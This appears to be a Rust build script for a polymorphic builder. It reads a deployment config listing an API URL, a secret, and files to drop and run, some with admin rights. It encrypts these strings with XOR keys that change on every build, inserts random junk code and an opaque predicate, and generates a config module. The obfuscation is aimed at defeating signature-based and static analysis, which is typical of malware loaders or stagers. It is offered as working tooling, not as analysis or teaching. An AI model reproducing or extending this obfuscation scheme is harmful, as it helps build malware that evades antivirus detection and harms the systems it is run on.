use std::env;
use std::fs;
use std::path::Path;
use serde::Deserialize;
use std::collections::HashMap;
use rand::Rng;

#[derive(Deserialize, Debug)]
struct FileConfig {
    name: String,
    target: String,
    run: bool,
    require_admin: bool,
}

#[derive(Deserialize, Debug)]
struct BuildConfig {
    api_url: String,
    profile: String,
    request_timeout: u64,
    api_secret: String,
    #[serde(flatten)]
    files: HashMap<String, FileConfig>,
}

/// Generate random XOR key
fn gen_xor_key() -> u8 {
    rand::thread_rng().gen()
}

/// Generate random multi-byte key
fn gen_multibyte_key(len: usize) -> Vec<u8> {
    (0..len).map(|_| rand::thread_rng().gen()).collect()
}

/// XOR encrypt string with key
fn xor_encrypt(s: &str, key: u8) -> Vec<u8> {
    s.bytes().map(|b| b ^ key).collect()
}

/// Multi-byte XOR encrypt
fn multibyte_encrypt(s: &str, key: &[u8]) -> Vec<u8> {
    s.bytes()
        .enumerate()
        .map(|(i, b)| b ^ key[i % key.len()])
        .collect()
}

/// Generate polymorphic string decryption code
fn gen_polymorphic_string(s: &str, var_name: &str) -> (String, u8) {
    let key = gen_xor_key();
    let encrypted = xor_encrypt(s, key);

    let code = format!(
        "lazy_static::lazy_static! {{\n    \
        static ref {}: String = {{\n        \
        let enc: &[u8] = &{:?};\n        \
        let key: u8 = {};\n        \
        enc.iter().map(|b| (b ^ key) as char).collect()\n    \
        }};\n\
        }}\n",
        var_name, encrypted, key
    );

    (code, key)
}

/// Generate junk code for polymorphism
fn gen_junk_code() -> String {
    let mut rng = rand::thread_rng();
    let junk_type = rng.gen_range(0..5);

    match junk_type {
        0 => {
            let a = rng.gen::<u32>();
            let b = rng.gen::<u32>();
            format!("let _junk_{} = {}u32.wrapping_add({});\n", rng.gen::<u32>(), a, b)
        }
        1 => {
            let iterations = rng.gen_range(10..50);
            format!("for _i in 0..{} {{ let _x = _i * 2; }}\n", iterations)
        }
        2 => {
            format!("if {}u32 > {}u32 {{ }} else {{ }}\n", rng.gen::<u32>(), rng.gen::<u32>())
        }
        3 => {
            let val = rng.gen::<u64>();
            format!("let _junk_{}: u64 = {};\n", rng.gen::<u32>(), val)
        }
        _ => {
            format!("let _junk_{} = std::time::SystemTime::now();\n", rng.gen::<u32>())
        }
    }
}

/// Generate opaque predicate (always true but hard to analyze)
fn gen_opaque_predicate() -> String {
    let mut rng = rand::thread_rng();
    let x = rng.gen_range(1..100);

    // (x * x) % 2 == (x % 2) is always true
    format!(
        "if ({} * {}) % 2 == {} % 2 {{\n    // Real code path\n}} else {{\n    // Never executed\n    std::process::exit(0);\n}}\n",
        x, x, x
    )
}

fn main() {
    println!("cargo:rerun-if-changed=../configs/deployment.toml");

    let config_path = Path::new("../configs/deployment.toml");
    let config_str = fs::read_to_string(config_path).expect("Could not read configs/deployment.toml");
    let config: BuildConfig = toml::from_str(&config_str).expect("Failed to parse TOML");

    let out_dir = env::var_os("OUT_DIR").unwrap();
    let dest_path = Path::new(&out_dir).join("generated_config.rs");

    // Generate random crypto keys for this build
    let key1 = gen_xor_key();
    let key2 = gen_multibyte_key(16);
    let key3 = gen_multibyte_key(32);

    // Write keys to separate files
    fs::write(Path::new(&out_dir).join("key1.txt"), format!("{}", key1)).unwrap();
    fs::write(Path::new(&out_dir).join("key2.txt"), format!("{:?}", key2)).unwrap();
    fs::write(Path::new(&out_dir).join("key3.txt"), format!("{:?}", key3)).unwrap();

    let mut out_str = String::new();

    // Add comment at the top
    out_str.push_str("// Polymorphic build-time generated code\n");

    // Generate config struct
    out_str.push_str("pub struct AppConfig {\n");
    out_str.push_str("    pub api_url: String,\n");
    out_str.push_str("    pub profile: String,\n");
    out_str.push_str("    pub request_timeout: u64,\n");
    out_str.push_str("    pub api_secret: String,\n");
    out_str.push_str("    pub files: Vec<FileConfig>,\n");
    out_str.push_str("}\n\n");

    out_str.push_str("pub struct FileConfig {\n");
    out_str.push_str("    pub name: String,\n");
    out_str.push_str("    pub target: String,\n");
    out_str.push_str("    pub run: bool,\n");
    out_str.push_str("    pub require_admin: bool,\n");
    out_str.push_str("}\n\n");

    // Encrypt critical strings with polymorphic keys
    let api_url_enc = xor_encrypt(&config.api_url, key1);
    let profile_enc = multibyte_encrypt(&config.profile, &key2);
    let secret_enc = multibyte_encrypt(&config.api_secret, &key3);

    out_str.push_str("pub fn get_config() -> AppConfig {\n");

    // Add junk code inside function
    out_str.push_str(&gen_junk_code());

    // Decrypt API URL at runtime
    out_str.push_str(&format!(
        "    let api_url_enc: &[u8] = &{:?};\n",
        api_url_enc
    ));
    out_str.push_str(&format!(
        "    let api_url: String = api_url_enc.iter().map(|b| ((b ^ {}) as u8) as char).collect();\n\n",
        key1
    ));

    // Decrypt profile
    out_str.push_str(&format!(
        "    let profile_enc: &[u8] = &{:?};\n",
        profile_enc
    ));
    out_str.push_str(&format!(
        "    let profile_key: &[u8] = &{:?};\n",
        key2
    ));
    out_str.push_str("    let profile: String = profile_enc.iter().enumerate().map(|(i, b)| ((b ^ profile_key[i % profile_key.len()]) as u8) as char).collect();\n\n");

    // Decrypt secret
    out_str.push_str(&format!(
        "    let secret_enc: &[u8] = &{:?};\n",
        secret_enc
    ));
    out_str.push_str(&format!(
        "    let secret_key: &[u8] = &{:?};\n",
        key3
    ));
    out_str.push_str("    let api_secret: String = secret_enc.iter().enumerate().map(|(i, b)| ((b ^ secret_key[i % secret_key.len()]) as u8) as char).collect();\n\n");

    out_str.push_str(&gen_junk_code());

    out_str.push_str("    AppConfig {\n");
    out_str.push_str("        api_url,\n");
    out_str.push_str("        profile,\n");
    out_str.push_str(&format!("        request_timeout: {},\n", config.request_timeout));
    out_str.push_str("        api_secret,\n");

    out_str.push_str("        files: vec![\n");
    for (_, f) in config.files {
        // Encrypt file configs too
        let name_enc = xor_encrypt(&f.name, key1);
        let target_enc = multibyte_encrypt(&f.target, &key2);

        out_str.push_str("            FileConfig {\n");
        out_str.push_str(&format!(
            "                name: {:?}.iter().map(|b| ((b ^ {}) as u8) as char).collect(),\n",
            name_enc, key1
        ));
        out_str.push_str(&format!(
            "                target: {{ let e: &[u8] = &{:?}; let k: &[u8] = &{:?}; e.iter().enumerate().map(|(i, b)| ((b ^ k[i % k.len()]) as u8) as char).collect() }},\n",
            target_enc, key2
        ));
        out_str.push_str(&format!("                run: {},\n", f.run));
        out_str.push_str(&format!("                require_admin: {},\n", f.require_admin));
        out_str.push_str("            },\n");
    }
    out_str.push_str("        ]\n");
    out_str.push_str("    }\n");
    out_str.push_str("}\n\n");

    fs::write(&dest_path, out_str).unwrap();

    println!("cargo:warning=Polymorphic build generated with unique keys");
}
